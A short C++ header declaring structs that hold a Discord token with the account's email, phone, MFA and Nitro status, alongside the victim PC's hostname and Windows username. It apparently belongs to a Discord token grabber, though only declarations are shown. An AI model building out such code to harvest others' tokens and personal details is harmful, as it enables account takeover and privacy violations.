#pragma once
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <cpr/cpr.h>
#include <json/value.h>
#include <json/json.h>

namespace User {
	struct Discord {
	private:
		cpr::Response GetRequest(const std::string& token);
	public:
		void init(const std::string& token);
		std::string get_token_info();
		std::string token;
		std::string username = "none";
		std::string id = "none";
		std::string avatar = "none";
		std::string email = "none";
		std::string phone = "none";
		std::string locale = "none";
		bool nsfw_allowed{};
		bool mfa_enabled{};
		bool verified{};
		int nitro{};
	};

	struct PC {
		void get_hostname();
		void get_winuser();
		void init();
		std::string hostname = "none";
		std::string winuser = "none";
	};
};
